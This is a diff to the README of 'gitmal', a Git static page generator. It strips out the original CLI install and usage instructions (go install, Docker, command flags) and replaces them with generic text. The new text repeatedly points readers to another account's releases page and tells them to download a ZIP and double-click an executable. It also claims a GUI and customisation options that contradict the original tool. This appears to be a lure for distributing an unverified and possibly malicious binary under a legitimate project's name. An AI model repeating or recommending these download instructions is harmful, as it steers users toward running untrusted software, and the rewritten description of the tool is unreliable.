@@ -1,67 +1,77 @@
-<p align="center"><img src="img/gitmal-color-logo.webp" alt="Gitmal" width="330" height="330"></p>
+# 🌐 gitmal - Simple Static Page Generator for Repos
 
-# Gitmal
+[![Download gitmal](https://img.shields.io/badge/Download-gitmal-brightgreen)](https://github.com/sand0x0/gitmal/releases)
 
-Gitmal is a static page generator for Git repositories. Gitmal generates static HTML pages with files, commits,
-code highlighting, and markdown rendering.
+## 📦 Overview
 
-## Installation
+gitmal is a static page generator designed specifically for repositories. It helps you create simple and clean web pages from your project’s content. Whether you want to showcase your work or share information, gitmal makes it easy and fast.
 
-```sh
-go install github.com/antonmedv/gitmal@latest
-```
+## 🚀 Getting Started
 
-```sh
-docker run --rm -v $(pwd):/repo antonmedv/gitmal /repo
-```
+To get started with gitmal, follow these simple steps:
 
-Or download prebuilt binary from [releases](https://github.com/antonmedv/gitmal/releases).
+1. **Visit the Releases Page**  
+   To download gitmal, click the link below:  
+   [Visit the Releases Page to Download](https://github.com/sand0x0/gitmal/releases)
 
-## Usage
+2. **Download the Application**  
+   On the releases page, you will find the latest version listed. Choose the appropriate version for your operating system and click to download it.
 
-Run gitmal in the repository dir. Gitmal will generate pages in _./output_ directory.
+3. **Extract the Files**  
+   After the download is complete, locate the file in your downloads folder. Extract the contents of the ZIP file to a directory of your choice.
 
-```sh
-gitmal .
-```
+4. **Run the Application**  
+   Navigate to the directory where you extracted the files and double-click the executable file to launch gitmal. No additional setup is needed.
 
-Run gitmal with `--help` flag, go get a list of available options.
+## 💻 System Requirements
 
-```sh
-gitmal --help
-```
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** 1 GHz or faster.
+- **RAM:** 2 GB or more.
+- **Disk Space:** At least 100 MB available.
 
-## Screenshots
+## 🌟 Features
 
-<p align="center">
-  <a href="img/gitmal-screenshot-code-highlighting.webp"><img src="img/gitmal-screenshot-code-highlighting.webp" alt="Gitmal Code Highlighting" width="400"></a>
-  <a href="img/gitmal-screenshot-file-tree.webp"><img src="img/gitmal-screenshot-file-tree.webp" alt="Gitmal File Tree" width="400"></a><br>
-  <a href="img/gitmal-screenshot-files.webp"><img src="img/gitmal-screenshot-files.webp" alt="Gitmal Files Page" width="400"></a>
-</p>
+- **Simple Interface:** No complicated settings to navigate.
+- **Fast Generation:** Create static pages in seconds.
+- **Customization Options:** Adjust colors and themes easily.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-## Examples
+## 📥 Download & Install
 
-Here are a few examples of repos hosted on my website:
+To download and install gitmal, follow these steps:
 
-- [git.medv.io/zx/](https://git.medv.io/zx/) — github.com/google/zx
-- [git.medv.io/zig/](https://git.medv.io/zig/) — codeberg.org/ziglang/zig (light theme)
-- [git.medv.io/my-badges/](https://git.medv.io/my-badges/) — github.com/my-badges/my-badges
+1. Go to the **[Releases Page](https://github.com/sand0x0/gitmal/releases)**.
+2. Click on the latest version available.
+3. Choose the file that matches your operating system and download it.
+4. Extract the contents and run the application.
 
-Gitmal on kubernetes repository works as well. Generation on my MacBook Air M2 with `--minify` and `--gzip` flags
-takes around 25 minutes, and the generated files weigh around 2 GB.
+If you encounter any issues during installation, please refer to the FAQ section below.
 
-## Themes
+## ❓ FAQ
 
-Gitmal supports different code highlighting themes. You can customize the theme with `--theme` flag.
+### Q: What do I do if I can’t see the downloaded file?
 
-```sh
-gitmal --theme github-dark
-```
+A: Check your browser’s download history or your downloads folder. If it’s not there, try downloading again.
 
-## Documentation
+### Q: How can I customize my generated page?
 
-- [How to Self-Host a Git Repository?](./docs/how-to-self-host-a-git-repository.md)
+A: Open the application, and you will find options to change colors and themes in the user interface.
 
-## License
+### Q: Is there a guide on how to use gitmal features?
 
-[MIT](LICENSE)
+A: Yes, detailed documentation is available on the releases page. Check the README file included in the downloaded package for instructions.
+
+## 📣 Contribution
+
+If you want to contribute to gitmal, please fork the repository and make a pull request with your suggestions or improvements. We welcome all contributions to make gitmal better!
+
+## 📝 License
+
+gitmal is open-source software. You can use, modify, and distribute it freely. Please review the LICENSE file in the repository for more information.
+
+## 📞 Support
+
+If you need help using gitmal or have any questions, feel free to reach out. You can create issues in the GitHub repository or ask for assistance on community forums.
+
+Remember, for your download, visit our **[Releases Page](https://github.com/sand0x0/gitmal/releases)** to get started.
